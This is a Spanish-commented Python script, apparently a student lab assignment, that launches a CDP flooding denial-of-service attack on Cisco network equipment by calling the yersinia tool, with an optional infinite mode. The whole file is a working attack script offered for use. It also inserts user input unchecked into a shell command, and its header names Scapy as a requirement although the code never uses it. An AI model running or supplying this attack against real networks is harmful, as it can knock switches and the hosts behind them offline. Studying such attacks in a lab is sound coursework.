#!/usr/bin/env python3
# =============================================================================
# Nombre:       MiguelRamirezMeli_2025-1367_Script_P1.py
# Autor:        Miguel Ramirez Meli
# Matrícula:    2025-1367
# Asignatura:   TSI-203
# Descripción:  Script de ataque DoS mediante el protocolo CDP (Cisco Discovery Protocol)
# Requisitos:   Kali Linux, Python 3, Scapy
# =============================================================================
#!/usr/bin/env python3
"""
Ataque DoS por inundación CDP usando yersinia.
Uso: sudo python3 cdp_dos_attack.py
"""

import subprocess
import sys
import os

def main():
    if os.geteuid() != 0:
        print("[!] Ejecuta con sudo.")
        sys.exit(1)

    # Verificar que yersinia esté instalado
    if subprocess.call("which yersinia", shell=True, stdout=subprocess.DEVNULL) != 0:
        print("[-] yersinia no está instalado. Instálalo con: sudo dpkg -i yersinia.deb")
        sys.exit(1)

    print("\n=== ATAQUE DoS POR CDP ===\n")
    iface = input("Interfaz de red (ej. eth0): ").strip() or "eth0"
    try:
        paquetes = int(input("Número de paquetes (0 = infinito): ").strip())
    except:
        paquetes = 5000

    if paquetes > 0:
        # Ataque con límite de paquetes (se estima 800 paq/seg)
        duracion = paquetes / 800 + 2
        print(f"\n[+] Enviando {paquetes} paquetes CDP...")
        subprocess.run(f"timeout {duracion} sudo yersinia cdp -attack 1 -i {iface}", shell=True)
        print("\n[+] Ataque finalizado.")
    else:
        print("\n[+] Ataque infinito. Presiona Ctrl+C para detener.")
        subprocess.run(f"sudo yersinia cdp -attack 1 -i {iface}", shell=True)

if __name__ == "__main__":
    main()
